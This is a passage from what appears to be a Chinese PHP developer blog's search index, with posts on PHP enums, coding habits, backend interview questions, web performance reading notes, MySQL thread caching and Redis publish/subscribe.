中使用枚举","slug":"how-do-I-use-enumerations-in-php","date":"2021-03-08T12:57:51.000Z","updated":"2021-03-08T12:59:13.169Z","comments":true,"path":"how-do-I-use-enumerations-in-php/","link":"","permalink":"https://www.0x2beace.com/how-do-I-use-enumerations-in-php/","excerpt":"在编写业务代码时，常常会遇到状态或者类型不一致造成的逻辑分支，这时，最忌讳的是直接在业务代码中对数值进行判断。","text":"在编写业务代码时，常常会遇到状态或者类型不一致造成的逻辑分支，这时，最忌讳的是直接在业务代码中对数值进行判断。 那么更好的方式应该是怎样呢？使用枚举。 使用枚举有以下几个好处： 减少因为直接输入数字而导致的错误 使代码更易于阅读 方便维护，后面需要添加新的类型时，不会突兀 PHP 本身不支持枚举，但是使用类中的常量去定义可以实现等价的效果。 定义枚举下面为用户类型创建一个枚举，用户可以是以下三种类型之一： 普通用户 管理员 超级管理员 看起来像这样： 123456class UserType extends Enum&#123; const MEMBER &#x3D; 1; const ADMIN &#x3D; 2; const SUPERADMIN &#x3D; 3;&#125; 使用枚举123if ($user-&gt;type &#x3D;&#x3D;&#x3D; UserType::MEMBER)&#123; &#x2F;&#x2F; todo &#125; 如果我们不使用枚举，代码可能就会变成这样： 1234567if ($user-&gt;type &#x3D;&#x3D;&#x3D; 1) &#123; &#x2F;&#x2F; 这个1表示什么?? &#x2F;&#x2F; todo&#125;if ($user-&gt;type &#x3D;&#x3D;&#x3D; &#39;Member&#39;) &#123; &#x2F;&#x2F; 这他妈咋么又是字符串 😞 &#x2F;&#x2F; todo &#125; 定义获取器很多时候我们希望能获取到某个类型对应的具体含义，这时可以通过定义获取器来获取。 12345678910111213class UserType extends Enum&#123; public static $userType &#x3D; [ self::MEMBER &#x3D;&gt; &quot;普通会员&quot;, self::ADMIN &#x3D;&gt; &quot;管理员&quot;, self::SUPERADMIN &#x3D;&gt; &quot;超级管理员&quot; ]; public static function getUserType($type) &#123; return self::$voucherMap[$type]; &#125; &#125; 这样当我们在调用getUserType 方法时，只需要传入对应的类型，就能获取到普通会员、管理员、超级管理员了。 参考链接 在 Laravel 中使用枚举","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"写代码的好习惯","slug":"good-habit-of-writing-code","date":"2021-03-02T14:20:53.000Z","updated":"2021-04-10T01:52:32.612Z","comments":true,"path":"good-habit-of-writing-code/","link":"","permalink":"https://www.0x2beace.com/good-habit-of-writing-code/","excerpt":"前段时间看到一篇比较火的文章，结合自己的一些经验，整理以下“好习惯”。","text":"前段时间看到一篇比较火的文章，结合自己的一些经验，整理以下“好习惯”。 修改完代码，一定要记得自测一下，即使只是改了一个变量。 方法入参尽量都做校验。 添加新接口时，需要注意老接口的兼容性。 对于复杂的代码逻辑，有必要写清楚注释。 使用完IO 资源流，一定要记得关闭。 尽量不要在循环里远程调用或者数据库操作，特别是select。优先考虑批处理。 考虑并发一致性的问题。 根据实际的业务场景去拆解功能，不是所有的功能都需要用特别高深的技术去实现。 避免多层if...else嵌套。 一个类做好一件事情，一个控制器维护好一个功能。 参考链接 写代码有这16个好习惯，可以减少80%非业务的bug","categories":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"PHP 常见面试题整理","slug":"php-common-interview-questions","date":"2021-02-25T11:51:45.000Z","updated":"2021-03-12T14:05:10.121Z","comments":true,"path":"php-common-interview-questions/","link":"","permalink":"https://www.0x2beace.com/php-common-interview-questions/","excerpt":"年前年后这段时间一直在为面试做准备，本文将从网络、PHP、Mysql、Redis、Linux 这几部分整理一下常见的一些面试简答题。","text":"年前年后这段时间一直在为面试做准备，本文将从网络、PHP、Mysql、Redis、Linux 这几部分整理一下常见的一些面试简答题。 网络篇常见的状态码及其含义 状态码 含义 200 请求成功 301 重定向 304 资源未被修改可以使用旧资源 404 资源找不到 403 请求被拒绝 500 服务端错误 502 网关错误 504 网关超时 表单提交 get 和 post 的区别 Get 请求是将请求参数放在 url 后面，等同于直接放在了请求头中，Post 请求则是把请求参数放在请求体中。 Post 更安全，不会作为url的一部分，不会被缓存及保存在浏览器记录中。 Post 能发送更多的内容及更多的数据类型，get 只能发送 2048 个ASCII 字符 Post 比Get 慢（原因是因为post 需要在服务器确认之后再发送数据） Get 通常用于资源的获取，Post 通常用于资源的更新 http 和 https 的区别 首先两者所使用的协议不一样，其端口也不一样。 这也是https 比 http 要安全的原因，http 是明文传输，数据都是未加密的，而https 则是 ssl + http 协议进行加密传输。 http 比 https 要快，这是因为http 只需要进行tcp 三次握手连接，只需要交换三个包，而 https 除了进行tcp 连接，还需要 ssl 握手的九个包，一共是十二个包。 https 是构建在http 之上的协议，理论上，https 相较 http 会更消耗服务器资源。 session 和 cookie 的区别 存储方式不同：cookie 是存储在客户端，session 则是存储在服务端。 隐私策略不同：cookie 因为存储在客户端中，所以对客户端是可见的，而session UDP 和TCP 的区别UDP 是面向报文的、不可靠的数据报协议，TCP 是面向连接的、可靠的流协议。 TCP 面向连接; UDP 不需要连接，即发送数据之前不需要建立连接; TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达; UDP尽最大努力交付，即不保保证可靠交付 TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流; UDP是面向报文的，UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低 每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信 TCP首部开销20字节;UDP的首部开销小，只有8个字节 TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道 说一说TCP 的“粘包”问题 结论：TCP 的“粘包”问题其实是一个伪命题。 服务端建立服务，客户端发起连接，正常情况下，服务端每次send，客户端都能正常recv，但在并发的情况下，服务端的两次send或者多次send，客户端可能只有一次recv了。这就导致了所谓的“粘包”问题的产生。 TCP 协议的本质是流协议，它只会保证以什么顺序发送字节，接受方就一定能按照这个顺序接收到，所以所谓的粘包问题不应该是传输层面的问题，而是应用层面的问题。 简述TCP 三次握手概念：指在发送数据的准备阶段，服务器和客户端之间需要三次交互。 第一次握手：客户端向服务端发送一个SYN包，并进入SYN_SENT 状态，等待服务端确认第二次握手：当服务器收到请求之后，此时要给客户端一个确认信息ACK，同时发送SYN报，此时服务器进入 SYN_RECV 状态第三次握手：客户端收到服务器发的ACK + SYN 包后，向服务器发送ACK，发送完毕之后，客户端和服务器进入TCP 连接成功状态，完成三次握手。 为什么握手一定要三次，不能两次吗？ 这是为了防止已经失效的连接请求报文突然又传到Tcp 服务器，避免产生错误。 简述TCP 四次挥手概念：所谓四次挥手就是说关闭TCP 连接的过程，当断开一个TCP 连接时，需要客户端和服务器共共发送四个包确认。 第一次挥手：客户端发送一个FIN，用来关闭客户端到服务器的数据传输，客户端进入 fin_wait 状态第二次挥手：服务器收到fin 后，发送一个ack 给客户端，确认序号为收到序号+1，服务器进入close_wait 状态第三次挥手：服务器发送一个fin 用来关闭服务器到客户端的数据传输，服务器进入 last_ack 状态第四次挥手：客户端收到fin 后，客户端进入time_wait 状态，接着发送一个ack 给服务器，确认序号为收到序号+1，服务器进入 closed 状态，完成四次挥手。 建立socket 需要哪些步骤 创建socket 绑定socket 到指定地址和端口 开始监听连接 读取客户端输入 关闭 socket 简述从浏览器输入 a.com 回车之后发生了什么 DNS 域名解析，寻找对应的IP 地址 根据这个IP 找到对应的服务器，建立TCP 连接（三次握手） TCP 建连之后，发起HTTP 请求 服务器响应 HTTP 请求 客户端接收数据解析并渲染页面 服务器关闭TCP 连接（四次挥手） 长连接与短连接的区别短连接为每一次的数据传输准备了一个传输通道，而长连接则是建立一条通道，并一直保持，每一次传输时都会复用同一条连接通道。 WebsocketWebsocket 是一种通信协议，连接刚开始还是HTTP 协议，由客户端发起，然后切换成Websocket 协议。 它的存在，由轮询变成了客户端可以主动向服务端发送消息。 什么是轮询？ 轮询是一种获取信息的方式。 PHP篇值传递和引用传递的区别值传递：传递的是变量在内存中的副本。引用传递：传递的是变量在内存中的地址。 unset 并不会真正意义上注销一个变量，而是切断了变量名和实际值之间的关系，其变量只要还被引用就还没有被释放。 composer 自动加载原理composer 的核心加载思想是通过composer 的autoload.php，将类和路径的对应关系加载到内存中，最后将具体的加载实现注册到 spl_autoload_register 函数中。 常用的请求第三方接口有哪几种方式？ curl file_get_contents fopen 抽象类和接口类的区别抽象用于描述不同的事物，接口用于描述事物的行为 进程与线程的区别进程是CPU 分配内存的最小单位，线程是CPU 调度的最小单位，一个进程可以有多个线程，一个线程只能有一个进程。 Swoole 的进程模型Swoole 的进程模型采用主进程、管理进程、异步任务/工作进程协作的方式。 Manager 进程主要负责创建/回收 worker/task 进程 Reactor 进程主要负责维护客户端 TCP 连接、处理网络 IO、处理协议、收发数据 Worker/Task 进程主要负责执行PHP 代码。 PHP 的进程模型在LNMP 的模式下，PHP 是php-fpm 多进程+阻塞I/O 的进程模型。 同步、异步、阻塞、非阻塞是怎么回事？ 同步和异步是一种消息通信机制。 阻塞和非阻塞是一种业务流程处理方式。 IO 多路复用：用一个线程来检查Socket 的就绪状态。 并发、并行有什么区别？并发：两件或者多件事情在同一时间间隔内发生并行：两件或者多件事情在同一时刻发生 区别在与：在同一个时刻，对于并行来说，事件是一并发生，而对于并发来说，在宏观看来也是一并发生，但在微观上却是交替发生。 简述PHP 代码解析过程Zend 引擎首先会将PHP 代码进行解析（词法、语法解析）成 opcode，然后Zend 虚拟机会顺序执行这些指令。 从LNMP 的角度简述一次完整的请求过程当客户端发起一个请求到服务端，Web Server 首先会判断该请求是静态还是动态？如果是静态，直接返回对应的静态资源。如果是动态，FastCGI 会将该请求转发给本地 9000 端口（9000 是 PHP—FPM 所监听的端口），PHP-FPM 主进程接收到请求之后，会分配一个空闲的 Worker 进程去处理这个请求，处理完成之后将数据返回给 FastCGI，再由 Nginx 返回给客户端。 PHP 可以做常驻内存吗？为什么？传统的PHP 无法以常驻内存的方式运行，这是因为PHP是解释型脚本语言，这种运行机制使得每个PHP 页面解释执行后，所有资源都被回收了。 通常如何实现用户登录（API）有两种方式：一种是普通的 token 令牌，另一种则是JWT。 普通Token：用户初次登录会携带用户名和密码等信息，服务端验证通过之后，会给客户端返回一个Token。这个Token 可以是由用户名、密码、登录设备、登录IP 等信息加密之后组成，以后的客户端每一次请求都会携带这个Token，服务端则会验证该Token。 在PHP中，你是如何捕获异常的？尽量避免使用exit、die方法直接退出，而使用try...catch来捕获异常。 常见设计模式创造型：工厂模式、单例模式、原型模式结构型：适配器模式、装饰模式、门面模式、代理模式行为型：迭代器模式、中介模式、观察者模式 什么是依赖注入依赖注入主要用来减少代码间的耦合，有效分离对象和它所需要的外部资源。 Mysql篇Mysql 的InnoDb 和MyISAM 引擎有何不同？ InnoDb 的特点包括：事务、锁 InnoDb 支持 ACID 的事务 4个特性，MyISAM 不支持事务。 InnoDB 支持行级别的锁粒度，MyISAM 不支持，只支持表级别的锁粒度。 什么是ACID（事务的四个特性）？ 原子性（Atomicity）：事务的所有操作，要么全部完成，要么全部不完成，不会结束在某个中间环节。 一致性（Consistency）：事务开始之前和事务结束之后，数据库的完整性限制未被破坏。 隔离性（Isolation）：两个或者多个事务的执行是互不干扰的，一个事务不可能看到其他事务运行时，中间某一时刻的数据。 持久性（Durability）：事务完成之后，事务所做的修改进行持久化保存，不会丢失。 Mysql 有几种事务隔离级别？有四种隔离级别。 死锁是什么？两个或多个事务在同一个资源上相互占用。 简述Mysql 索引、主键及其常见索引索引就是类似于书籍目录的存在，主键是用于确定字段的唯一性。 普通索引：最普通的索引，使用没有什么限制。 唯一索引：与普通索引类型，唯一不同的是，列值不允许重复，但允许有空值。 主键索引：主键本身自带的索引，不允许有空值。 全文索引：仅可用于 MyISAM 表，针对较大的数据，生成全文索引很耗时占空间 组合索引：为了提高多条件查询效率，可建立组合索引，遵循”最左前缀匹配原则” 但是索引也不是越多越好，索引加快了查询速度，但同时也会影响更新速度。 Redis篇Redis 和Memcache 的区别 Redis 支持多种数据类型，Memcache 只支持Key-Value Redis 支持两种持久化，Memcache 不支持持久化。 Redis 的常见数据结构及其应用场景 字符串 哈希 列表 无序列表 集合 Redis 的持久化有几种方案？有三种，分别是：RDB、AOF、混合。 RDB：将某一时刻的数据以二进制形式写入到磁盘里，服务重启时检测到对应文件自动加载进行数据恢复，有手动触发和自动触发两种机制。 AOF：以文件追加的方式写入客户端执行的写命令，数据恢复时，通过创建伪客户端的方式执行命令，直到恢复完成。 混合：在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。 为什么Redis 是单线程？Linux篇说一下你常用的Linux 命令（最基础的不用说） 网络：ping、tcpping、telnet、netstat、nmap、lsof、tcpdump 磁盘：df、du 进程：ps、pstree 内存：free 负载：top 压测工具：ab、wrk 文件上传/下载：curl、wget、scp 综合：glances 基本的运维需要监控哪些数据？ 系统层：CPU、内存、负责、网卡、I/O 应用层：QPS、API响应时长、Redis内存使用量、任务队列数、php-fpm 进程数、Mysql线程数 健康巡查：dns 解析、ip 是否可以访问、硬盘、各种基础服务 其他说一说你所知道的网站攻击方式及如何防范 CSRF 跨站伪造请求 XSS 跨站脚本攻击 SQL 注入 DDOS 攻击 如果用户反馈网站慢，你会怎样做？ 资源加载慢i. WebServer 配置静态资源缓存、动静分离ii. DNS 缓存、CDN 加速iii. 增加服务器带宽 SQL 查询慢i. Mysql 慢查询找出耗时SQLii. Explain 分析耗时原因iii. 优化SQL 并发i. 优化PHP-FPM 配置 如果你发现你部署的网站打不开了，你会如何排查？ 首先检查DNS 解析i. 检查域名解析ii. 排除浏览器缓存 检查防火墙i. 防火墙是否开启？ii. 端口是否可以正常访问，通常使用telnet 命令检查 根据网站返回状态码，具体分析i. 404：访问资源不存在ii. 500：服务端错误（代码错误、文件权限）iii. 502：网关错误（webserver 异常导致，Nginx/Apache 发生错误）iiii. 504：网关超时 查看对应的日志 参考链接 PHP面试问答","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"面试","slug":"面试","permalink":"https://www.0x2beace.com/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"《构建高性能 Web 站点》读书笔记","slug":"building-a-high-performance-web-site-reading-notes","date":"2021-02-06T15:49:18.000Z","updated":"2021-02-07T10:55:17.460Z","comments":true,"path":"building-a-high-performance-web-site-reading-notes/","link":"","permalink":"https://www.0x2beace.com/building-a-high-performance-web-site-reading-notes/","excerpt":"《构建高性能 Web 站点》读书笔记","text":"《构建高性能 Web 站点》读书笔记 绪论等待的真相当在浏览器中输入了一个地址，直到浏览器返回页面之前的那段时间里，都发生了一些什么呢？ 大概经历了以下几部分时间： 数据在网络上传输的时间 客户端（浏览器）发出请求数据到达服务器的时间 服务端（服务器）响应数据经过网络到达客户端的时间 站点服务器处理请求并生成响应数据的时间 浏览器本地计算和渲染的时间 “数据在网络上传输的时间”我们通常称之为响应时间，它的决定因素主要包括发送的数据量和网络宽带。 站点服务器处理请求并生成响应数据的时间主要消耗在服务端，其中包括非常多的环节，我们一般用另一个指标来衡量这部分时间，即每秒处理请求数，也称吞吐率，这里的吞吐率并不是指单位时间内处理的数据量，而是请求数。影响服务器吞吐率的因素非常多，比如：服务器的并发策略、I/O 模型、I/O 性能、CPU 核数等，当然也包括应用程序本身的逻辑复杂度等。 浏览器本地计算和渲染的时间自然消耗在浏览器端，它依赖的因素包括浏览器采用的并发策略、样式渲染方式、脚本解释器的性能、页面大小、页面组件（图片、CSS、JS等）数量、页面组件缓存状况、页面组件域名分布及DNS 解析等。 数据得网络传输因为大多数开发者生活在应用层，这些似乎与他们毫无关系，然而一旦当你开始将注意力转向站点性能时，这些基础知识便是你不能不知道的。 如何计算响应时间 响应时间 = 发送时间 + 传播时间 + 处理时间 发送时间很容易计算，即”数据量/宽带“，比如要发送100Mbit 的数据，而且发送速度为 100Mbit/s，也就是宽带为 100M，那么发送时间便为 1s。值得注意的是，在两台主机之间往往存在多个交换节点，每次的数据转发，都需要花费发送时间，那么总的发送时间也包括这些转发时所花费的发送时间。 传播时间主要依赖于传播距离，因为传播速度我们可以近似认为约等于 2.0x108m/s，那么传播时间便等于传播距离除以传播速度。比如两个交换节点之前线路的长度为 1000km，相当于北京到上海的直线距离，那么一个比特信号从线路的一端到另一端的传播时间为 0.005s。 处理时间就是指数据在交换节点中为存储转发而进行一些必要的处理所花费的时间，其中的重要组成部分就是数据在缓冲区队列中排队所发送的时间。注意，准确地说应该是”你的数据“在队列中排队所花费的时间，因为在队伍中还有其他与你毫不相干的数据。 如果全世界只有你的服务器和你的用户在传输数据，那么用于排队处理时间可以忽略。 那么，我们可将响应时间的计算公式整理为：响应时间 = （数据量比特数 / 带宽）+ （传播距离 / 传播速度）+ 处理时间 另外，下载速度的计算公式如下：下载速度 = 数据量字节数 / 响应时间 服务器并发处理能力吞吐率指的是单位时间内服务器的请求数。 吞吐率是指在一定并发用户数的情况下，服务器处理请求能力的量化体现。 我们要统计吞吐率，便存在一些潜在的前提，那就是压力的描述和请求性质的描述。 压力的描述一般包括两部分，即并发用户数和总请求数，也就是模拟多少个用户同时向服务器发送多少个请求。 请求性质则是堆请求的URL 所代表的资源的描述，比如 1KB 大小的静态文件，或者包含10 次数据库查询的动态内容等。 所以，吞吐率的前提包括如下几个条件： 并发用户数 总请求数 请求资源描述 CPU 并发计算服务器之所以可以同时处理多个请求，在于操作系统通过多执行流体希设计使得多个任务可以轮流使用系统资源，这些资源包括CPU、内存以及I/O 等。 进程事实上，大多数进程的时间都主要消耗在了I/O操作上，现代计算机的DMA（Direct Memory Access 直接内存访问）技术可以让CPU 不参与I/O 操作的全过程，比如进程通过系统调用，使得CPU 向网卡或者磁盘等 I/O 设备发出指令，然后进程被挂起，释放出CPU 资源，等待 I/O 设备完成工作后通过中断来通知进程重新就绪。 每个进行都有自己独立的内存地址空间和生命周期。当子进程被父进程创建后，便将父进程地址空间的所有数据复制到自己的地址空间，完全继承父进程的所有上下文信息，它们之间可以通信，但是不互相依赖，也无权干涉彼此的地址空间。 进程调度器在单CPU 的机器上，虽然我们感觉到很多任务在同时运行，但是从微观意义上讲，任何时刻只有一个进程处于运行状态，而其他的进程有的处于挂起状态并等待就绪，有的已经就绪但等待CPU 时间片，还有的处于其他状态。 内核中的进程调度器（Scheduler）维护着各种状态的进程队列。在 Linux 中，进程调度器维护着一个包括所有可运行进程的队列，称为“运行队列（Run Quere）”，以及一个包括所有休眠进程和僵尸进程的列表。 进程调度器的一项重要工作就是决定下一个运行的进程，如果运行队列中有不止一个进程，那就比较伤脑筋了，按照先来后到的顺序也许不是那么合理，因为运行在系统中的进程有着不同的工作需要，比如有些进程需要处理紧急的事件，有些进程只是在后台发送不太紧急的邮件，所以每个进程需要告诉进程调度器它们的紧急程度，这就是进程优先级。 系统负载在进程调度器维护的运行队列中，任何时刻至少存在一个进程，那就是正在运行的进程。而当运行队列中有不止一个进程的时候，就说明此时CPU 比较抢手，其他进程还在等着呢，进程调度器应该尽快让正在运行的进程释放CPU。 通过在任何时刻查看 /proc/loadavg，可以了解到运行队列的情况。 12ubuntu@localhost:~$ cat &#x2F;proc&#x2F;loadavg 4.28 4.05 4.02 4&#x2F;482 6246 注意 4/482这部分，其中的 4 代表此时运行队列中的进程个数，而 482 则代表此时的进程总数。 最右边的 6246 代表到此时为止，最后创建的一个进程ID。 接下来，左边的三个数值，分别是 4.28、4.05、4.02，它们就是我们常说的系统负载。我们都知道，系统负载越高，代表CPU 越繁忙，越无法很好地满足所有进程的需要。 但是，系统负载是如何计算而来的呢？根据定义，它是在单位时间内运行队列中就绪等待的进程数平均值，所以当运行队列中就绪进程不需要等待就可以马上获得CPU 的时候，系统负载便非常低。当系统负载为 0.00 时，说明任何进程只要就绪后就可以马上获得 CPU，不需要等待，这时候系统响应速度最快。 那么，刚才提到的三个数值，便是系统最近 1 分钟、5 分钟、15 分钟分别计算得出的系统负载。 我们还可以通过其他方法获得系统负载，比如top、w 等工具，从实现方法上看，这些工具获得的系统负载都是来源于 /proc/loadavg。 了解了这些内容后，要想提高服务器的系统负载，很简单，只需要编写一个没有任何 I/O 操作并且长时间占用 CPU 时间的PHP 脚本，比如一个循环累加器，如下所示： 12345678&lt;?php$max &#x3D; 100000000;$sum &#x3D; 0;for ($i &#x3D; 0; $i &lt; $max; ++$i)&#123; $sum +&#x3D; $i;&#125;echo $sum; 然后用100 个并发用户请求这个脚本，进行压力测试，这时候查看系统负载就会看到如下： 1load average: 98.26, 45.89, 17.94 进程切换所以，如果我们希望服务器支持较大的并发数，那么就要尽量减少上下文切换次数，最简单的做法就是减少进程数，尽量使用线程并配合其他I/O 模型来设计并发策略。 I/O模型对于网络 I/O和磁盘 I/O，它们的速度要慢很多。这些I/O 操作需要由内核系统调用来完成，同时系统调用显然需要CPU 来调度，而CPU 的速度毫无疑问是非常快的，这就使得CPU 不得不浪费宝贵的时间来等待慢速I/O 操作。 尽管我们通过多进程等方式来充分利用空闲的CPU 资源，但我们还是希望能够让CPU 花费足够少的时间在I/O 操作的调度上，这样就可以腾出更多的CPU 时间来完成更多的I/O 操作。 PIO与DMA在介绍I/O 模型之前，有必要简单地说说慢速I/O 设备和内存之间的数据传输方式。 我们拿磁盘来说，很早以前，磁盘和内存之间的数据传输是需要CPU 控制的，也就是说如果我们读取磁盘文件到内存中，数据要经过CPU 存储转发，这种方式称为 PIO。显然这种方式非常不合理，需要占用大量的CPU 时间来读取文件，造成文件访问时系统几乎停止响应。 后来，DMA（Direct Memory Access 直接内存访问）取代了PIO，它可以不经过CPU 而直接进行磁盘和内存的数据交换。在DMA 模式下，CPU 只需要向DMA 控制器下达指令，让DMA 控制器来处理数据的传输即可，DMA 控制器通过系统总线来传输数据，传送完毕再通知CPU，这样就很大程度上降低了CPU 占有率，大大节省了系统资源，而它的传输速度与PIO 的差异并不是十分明显，因为这主要取决于慢速设备的速度。 opcode缓存更加注重的是策略，也就是说缓存命中率，如果每次都能在缓存中找到需要的数据，那是最理想的结果，如果每次都在缓存中找不到需要的数据，那么缓存将变得毫无价值。 解释器核心引擎根本看不懂这些脚本代码，无法直接执行，所以需要进行一系列的代码分析工作，当解释器完成对脚本代码的分析后，便将它们生成可以直接运行的中间代码，也称为操作码（Operate Code，opcode）。 对于解释型语言而言，从程序代码到中间代码的这个过程，我们称为解释（parse），它由解释器来完成。对于编译型语言而言，从程序代码到中间代码的这个过程称为编译（compile）。 编译器和解释器的一个本质区别在于，解释器生成中间代码后，便直接执行它，所以运行时的控制权在解释器; 而编译器则将中间代码进一步优化，生成可以直接运行的目标程序，但不执行它，用户可以在随后的任意时间执行它，这时控制权在目标程序，和编译器没有任何关系。 事实上，就解释和编译本身而言，它们的原理是相似的，都包括词法分析、语法分析、语义分析等。 为什么开启 opcode，对性能的提升会巨大？这是因为 PHP 在动态解析语法的过程中，会生成操作码，而打开opcode 缓存，就可以避免重复编译。 当然，并不是所有的动态内容都在应用了 opcode cache 之后有大幅度的性能提升，因为 opcode cache 的目的是减少CPU 和内存开销，如果动态内容的性能瓶颈不在于CPU 和内存，而在于I/O 操作，比如数据库查询带来的磁盘I/O 开销，那么opcode cache 的性能提升是非常有限的。 有意义的问题Q：假如100 个用户同时向服务器分别进行 10次请求，与 1 个用户向服务器连续进行 1000 次请求，效果一样吗？也就是说给服务器带来的压力一样吗？A：虽然看起来服务器都需要连续处理 1000 个请求，其实关键的区别就在于，是否真的”连续“。首先有一点需要明白，对于压力测试中提到的每一个用户，连续发送请求实际上是指在发送一个请求并接受到响应数据后再发送下一个请求，这样一来，从微观层面来看，1 个用户向服务器连续进行 1000次请求的过程中，任何时刻服务器的网卡接收缓冲区中只有来自该用户的 1 个请求，而 100 个用户同时向服务器分别进行 10 次请求的过程中，服务器网卡接收缓冲区最多有 100 个等待处理的请求，显然这时服务器的压力更大。 Q：关于worker 进程的数量，既然可以由我们来设置，那么是不是越多越好呢？A：显然不是，任何时刻从CPU 的角度来看，只有一个进程在运行。没有一个绝对的公式来告诉你如何选择worker 进程数，需要根据实际情况具体分析和调整。 Q：7ms 意味着什么呢？A：一个比特通过光纤从北京传到西安，理论上只需要 5ms; 25 毫秒足以让比特传播接近地球赤道半径的距离。 Q：缓存的目的？A：缓存的目的就是把需要花费昂贵开销的计算结果保存起来，在以来需要的时候直接取出，避免重复计算。","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP 中实现 Mysql 连接池与持久化","slug":"mysql-connection-pool-and-persistence-in-php","date":"2021-02-03T11:42:17.000Z","updated":"2021-02-03T12:46:55.581Z","comments":true,"path":"mysql-connection-pool-and-persistence-in-php/","link":"","permalink":"https://www.0x2beace.com/mysql-connection-pool-and-persistence-in-php/","excerpt":"Mysql 的连接方式有两种：tcp 和 socket。前者是基于tcp/ip协议，后者是基于socket 套接字。","text":"Mysql 的连接方式有两种：tcp 和 socket。前者是基于tcp/ip协议，后者是基于socket 套接字。 具体： tcp/ip：mysql -h 127.0.0.1 -uroot -p socket：mysql -h localhost -uroot -p 或者 mysql -uroot -p 可以通过 tcpdump命令抓包。 指定源端口： 1$ tcpdump -i lo0 port 3306 如果出现以下内容，表示本地没有lo0这个设备。 12tcpdump: lo: No such device exists(BIOCSETIF failed: Device not configured) 可以通过tcpdump -D 命令查看本地设备名称： 121.en0 [Up, Running]2.lo0 [Up, Running, Loopback] 使用mysql -h 127.0.0.1 -uroot -p，可以看到Mysql 的连接过程是基于tcp/ip 协议。 当客户端退出Mysql 时，会发送四条记录，也就是tcp 的四次挥手。 socket 方式会快于tcp/ip， mysql 使用线程来处理连接，每当一个请求进来，MySQL会创建一个线程去处理请求， 可以使用show status命令查看当前处于连接状态的线程个数，所以在高并发下，这将给MySQL服务器带来巨大的压力，消耗服务器资源。 Mysql 线程池实际上 mysql 实现了线程池，当客户端断开连接后，mysql 会将当前线程缓存起来，当下一次有新的请求进来时，无需创建新的线程。 查看线程池大小： 1mysql&gt; show variables like &#39;thread_cache_size&#39;; 设置线程池大小： 1mysql&gt; set global thread_cache_size &#x3D; 20; 查看线程池状态： 12345678910mysql&gt; show status like &#39;Threads_%&#39;;+-------------------+-------+| Variable_name | Value |+-------------------+-------+| Threads_cached | 8 || Threads_connected | 3 || Threads_created | 53 || Threads_running | 1 |+-------------------+-------+4 rows in set (0.02 sec) 其中： Threads_cached：空闲线程数量。当有新的请求进来时，mysql 不会立即创建线程去处理，而是去Threads_cached查看空闲的连接线程，如果存在则直接使用，不存在则创建新的线程。 Threads_connected：当前处于连接状态的线程个数。 Threads_created：创建过的线程数，如果发现Threads_created值过大的话，表明 mysql 服务器一直在创建线程，这也是比较耗资源，可以适当增加配置文件中Thread_cache_size值。 Threads_running：处于激活状态的线程的个数，这个一般都是远小于Threads_connected的。 线程池的出现解决了频繁的创建连接和销毁连接的问题，但仅有线程池还是不够的，不能解决客户端频繁连接mysql 带来的性能损耗。 参考链接 PHP中实现MySQL连接池与持久化 用Swoole4 打造高并发的PHP协程Mysql连接池","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"PHP 实践 Redis 发布订阅","slug":"php-practice-redis-publish-and-subscribe","date":"2021-01-22T14:57:36.000Z","updated":"2021-01-22T14:58:49.610Z","comments":true,"path":"php-practice-redis-publish-and-subscribe/","link":"","permalink":"https://www.0x2beace.com/php-practice-redis-publish-and-subscribe/","excerpt":"Redis 集成了Pub/Sub功能（means Publish, Subscribe）即发布及订阅功能。","text":"Redis 集成了Pub/Sub功能（means Publish, Subscribe）即发布及订阅功能。 Redis 有各种语言的客户端，这里仅以PHP 的客户端来了解Redis 的发布订阅。 发布者：即publish客户端，无需独占链接，你可以在publish消息的同时，使用同一个redis-client链接进行其他操作（例如：INCR等） 订阅者：即subscribe客户端，需要独占链接，即进行subscribe期间，redis-client无法穿插其他操作，此时client以阻塞的方式等待“publish端”的消息；这一点很好理解，因此subscribe端需要使用单独的链接，甚至需要在额外的线程中使用。 终端实现订阅者订阅频道： 发布者向频道中发送内容 代码实现subscribe 客户端： 12345678910111213141516171819202122&lt;?php$redis &#x3D; getConnect();$redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1); $redis-&gt;subscribe([&quot;channel1&quot;], function ($instance, $chan, $msg) &#123; echo $msg; &#x2F;** * $instance 是上面创建的Redis 实例对象，因为独占链接的关系，该实例不能执行其他操作。 * 如果要使用Redis，需新建一个连接 *&#x2F; $redis &#x3D; getConnect(); $redis-&gt;get(&quot;name&quot;); &#x2F;&#x2F; todo 业务逻辑&#125;);function getConnect()&#123; $redis &#x3D; new Redis(); $redis-&gt;connect(&quot;127.0.0.1&quot;, 6379); $redis-&gt;auth(&quot;&quot;); return $redis;&#125; publish 客户端： 12345&lt;?php$redis &#x3D; new Redis();$redis-&gt;connect(&quot;127.0.0.1&quot;, 6379);$redis-&gt;publish(&#39;channel1&#39;, 